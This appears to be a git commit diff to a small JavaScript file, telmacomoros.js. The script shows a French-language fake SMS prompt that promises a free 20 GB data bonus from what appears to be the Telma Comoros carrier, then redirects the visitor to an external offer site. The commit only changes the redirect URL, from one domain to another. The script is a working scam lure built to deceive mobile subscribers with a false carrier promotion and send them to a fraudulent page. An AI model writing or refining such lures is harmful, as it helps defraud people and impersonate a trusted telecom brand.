8b63dc4e39f0409125ccee8dd57176c5603f7d72
harryjohnson86 <mfonjohnson86@gmail.com>
2025-01-10 16:16:06 -0800

    Update telmacomoros.js

--- telmacomoros.js
+++ telmacomoros.js
@@ -1,5 +1,5 @@
 var password = '20 Go de données gratuites'
 password=prompt('SMS: Félicitations, votre numéro est éligible pour recevoir un bonus de données gratuit de 20 Go. RÉCOMPENSE DE DONNÉES BONUS DE MISE À NIVEAU DU NOUVEL AN, veuillez appuyer sur OK pour ACTIVER. ','20 Go de données gratuites');
 if (password != '20 Go de données gratuites') {
-location.href='https://legitools.xyz/mtcsim-upgrade.10gbdata.html';
+location.href='https://offerforall.info/telmacomoros.html';
 }
